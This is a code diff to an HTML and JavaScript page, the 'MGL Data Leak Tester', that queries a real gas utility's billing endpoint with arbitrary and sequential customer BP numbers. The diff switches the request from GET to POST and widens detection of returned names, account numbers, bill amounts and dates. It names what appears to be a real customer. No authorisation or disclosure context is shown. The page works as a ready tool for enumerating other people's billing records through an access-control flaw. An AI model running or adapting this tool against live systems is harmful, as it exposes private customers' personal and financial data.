@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MGL Data Leak Tester - Fixed</title>
+    <title>MGL Data Leak Tester - POST Method</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -87,6 +87,13 @@
             margin-left: 10px; transition: 0.3s;
         }
         .copy-btn:hover { background: #2a3a7a; color: #fff; }
+        .field-highlight {
+            background: #ff6b6b22;
+            border-left: 3px solid #ff6b6b;
+            padding: 2px 8px;
+            margin: 2px 0;
+            border-radius: 4px;
+        }
         @media (max-width: 600px) {
             .container { padding: 20px; }
             h1 { font-size: 22px; }
@@ -99,7 +106,7 @@
 
 <div class="container" id="app">
     <h1>🔍 MGL Data Leak Checker</h1>
-    <div class="subtitle">✅ Fixed: GET method + correct URL — Shows full JSON response</div>
+    <div class="subtitle">✅ POST Method — Shows complete JSON response with leak detection</div>
 
     <div class="input-group">
         <input type="text" id="bpInput" placeholder="Enter BP Number (e.g. 1100081031)" value="1100081031">
@@ -112,6 +119,7 @@
         <button onclick="quickTest('1100081999')">🔸 Random (1100081999)</button>
         <button onclick="quickTest('1100081050')">🔹 Random (1100081050)</button>
         <button onclick="quickTest('1100082001')">🔸 Random (1100082001)</button>
+        <button onclick="quickTest('1100081088')">🔹 New (1100081088)</button>
     </div>
 
     <div class="status-bar">
@@ -147,17 +155,16 @@
         leakBadge.style.background = '#f0b40022';
         leakBadge.style.borderColor = '#f0b40044';
         leakBadge.style.color = '#f0b400';
-        resultBox.innerHTML = `<span style="color:#8892b0;">⏳ Sending request to server...</span>`;
+        resultBox.innerHTML = `<span style="color:#8892b0;">⏳ Sending POST request to server...</span>`;
 
-        // 🔥 FIX: Use GET method with query parameter
-        const url = `https://www.mahanagargas.com/ajax/get-billing-details?bp_number=${encodeURIComponent(bp)}`;
+        // 🔥 FIX: Use POST method with FormData
+        const formData = new FormData();
+        formData.append('bp_number', bp);
 
         try {
-            const response = await fetch(url, {
-                method: 'GET',
-                headers: {
-                    'Accept': 'application/json'
-                }
+            const response = await fetch('https://www.mahanagargas.com/ajax/get-billing-details', {
+                method: 'POST',
+                body: formData
             });
 
             const text = await response.text();
@@ -177,51 +184,61 @@
                 formattedOutput = text.substring(0, 3000);
             }
 
-            // DETECT LEAK
+            // DETECT LEAK - More comprehensive
             let leakDetected = false;
             let leakReason = '';
             let responseBP = '';
+            let leakedFields = [];
 
             if (isJson && json) {
                 const jsonStr = JSON.stringify(json);
                 
-                // Check for customer data indicators
-                const hasName = jsonStr.match(/Customer Name|MEHTA|DILIP|KESHAVLAL|customer_name|name/i);
-                const hasCA = jsonStr.match(/Customer Account|CA|account_number|ca/i);
-                const hasBill = jsonStr.match(/bill_number|bill_date|bill_amount|net_payable/i);
-                const hasDifferentBP = jsonStr.match(/110008\d{4}/);
+                // Check for customer data fields
+                const fields = {
+                    'Customer Name': jsonStr.match(/Customer Name|customer_name|name|MEHTA|DILIP|KESHAVLAL/i),
+                    'CA Number': jsonStr.match(/Customer Account|CA|account_number|ca/i),
+                    'Bill Number': jsonStr.match(/bill_number|bill_no/i),
+                    'Bill Date': jsonStr.match(/bill_date|bill_dt/i),
+                    'Due Date': jsonStr.match(/due_date|due_dt/i),
+                    'Bill Month': jsonStr.match(/bill_month|month/i),
+                    'Group': jsonStr.match(/group|MW\d{6}/i),
+                    'Net Payable': jsonStr.match(/net_payable|amount|₹|Rs/i)
+                };
 
-                if (hasDifferentBP) {
-                    const bpMatch = jsonStr.match(/110008\d{4}/);
-                    if (bpMatch && bpMatch[0] !== bp) {
-                        responseBP = bpMatch[0];
+                // Check for different BP in response
+                const bpMatch = jsonStr.match(/110008\d{4}/);
+                if (bpMatch && bpMatch[0] !== bp) {
+                    responseBP = bpMatch[0];
+                    leakDetected = true;
+                    leakReason = `Response contains DIFFERENT BP: ${responseBP}`;
+                    leakedFields.push('⚠️ DIFFERENT BP NUMBER');
+                }
+
+                // Check each field
+                for (const [field, match] of Object.entries(fields)) {
+                    if (match) {
                         leakDetected = true;
-                        leakReason = `Response contains DIFFERENT BP: ${responseBP}`;
+                        leakedFields.push(field);
                     }
                 }
 
-                if (hasName || hasCA || hasBill) {
-                    leakDetected = true;
-                    if (!leakReason) leakReason = 'Response contains customer data (Name/Account/Bill)';
+                if (leakDetected && !leakReason) {
+                    leakReason = `Contains ${leakedFields.join(', ')}`;
                 }
 
-                // Also check if it has any data at all
-                if (json && (json.status === 'success' || json.data || json.bill_number || json.customer_name)) {
+                // If no leak indicators but has data, still suspicious
+                if (!leakDetected && Object.keys(json).length > 0) {
                     leakDetected = true;
-                    if (!leakReason) leakReason = 'Valid data returned for this BP';
-                }
-
-                // If response has error about invalid BP, it's safe
-                if (json && (json.error && json.error.includes('invalid'))) {
-                    leakDetected = false;
-                    leakReason = 'API returned error: Invalid BP';
+                    leakReason = 'API returned data (may be own data or leak)';
+                    leakedFields.push('⚠️ DATA RETURNED');
                 }
 
             } else {
                 // Raw text check
                 const textLower = text.toLowerCase();
                 if (textLower.includes('customer') || textLower.includes('mehta') || 
-                    textLower.includes('bill') || textLower.includes('account')) {
+                    textLower.includes('bill') || textLower.includes('account') ||
+                    textLower.includes('amount') || textLower.includes('₹')) {
                     leakDetected = true;
                     leakReason = 'Raw response contains customer data keywords';
                 }
@@ -231,7 +248,7 @@
                 }
             }
 
-            // Display result with syntax highlighting
+            // Build display
             let displayHTML = '';
             if (isJson && json) {
                 displayHTML = syntaxHighlightJSON(formattedOutput);
@@ -239,17 +256,26 @@
                 displayHTML = `<span class="label">📄 Raw Response:</span>\n\n` + escapeHtml(formattedOutput);
             }
 
-            // Add leak detection at top
+            // Add leak detection at top with details
             if (leakDetected) {
                 statusText.innerHTML = `🚨 <strong style="color:#ff6b6b;">DATA LEAK DETECTED!</strong> BP ${bp} returned someone else's data!`;
                 leakBadge.textContent = '🚨 LEAK CONFIRMED';
                 leakBadge.style.background = '#ff6b6b22';
                 leakBadge.style.borderColor = '#ff6b6b';
                 leakBadge.style.color = '#ff6b6b';
-                resultBox.innerHTML = `<span class="leak">🚨 LEAK FOUND!</span> <span style="color:#8892b0;font-size:12px;">(${leakReason})</span>\n\n` + displayHTML;
-                if (responseBP) {
-                    resultBox.innerHTML += `\n\n⚠️ <span class="leak">BP in response: ${responseBP} (different from request: ${bp})</span>`;
+                
+                let leakDetails = `<span class="leak">🚨 LEAK FOUND!</span> <span style="color:#ff6b6b;font-size:13px;">(${leakReason})</span>\n\n`;
+                if (leakedFields.length > 0) {
+                    leakDetails += `<span class="label">📋 Fields leaked:</span>\n`;
+                    leakedFields.forEach(f => {
+                        leakDetails += `  <span class="field-highlight">• ${f}</span>\n`;
+                    });
+                    leakDetails += `\n`;
                 }
+                if (responseBP) {
+                    leakDetails += `⚠️ <span class="leak">BP in response: ${responseBP} (different from request: ${bp})</span>\n\n`;
+                }
+                resultBox.innerHTML = leakDetails + displayHTML;
             } else {
                 statusText.innerHTML = `✅ <strong style="color:#6bff6b;">No leak detected</strong> for BP ${bp}`;
                 leakBadge.textContent = '✅ SAFE';
